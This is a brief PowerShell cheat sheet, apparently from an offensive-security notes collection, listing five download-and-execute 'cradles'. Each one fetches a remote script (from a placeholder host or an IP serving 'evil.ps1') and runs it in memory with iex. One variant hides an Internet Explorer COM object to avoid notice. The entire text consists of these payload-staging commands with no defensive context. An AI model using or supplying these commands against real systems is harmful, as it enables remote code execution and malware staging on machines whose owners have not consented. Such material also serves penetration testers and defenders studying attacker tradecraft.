#### Methods to Download and Execute in PowerShell



```powershell
iex (New-Object Net.Webclient).DownloadString('http://address.com/file.ps1')


$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://address.com/file.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response


#PSv3 and on
iex (iwr 'http://address.com/file.ps1')


$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://192.168.133.136/evil.ps1',$false);$h.send();iex $h.responseText


$wr = [System.NET.WebRequest]::Create("http://192.168.133.136/test.txt") 
$r = $wr.GetResponse() 
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

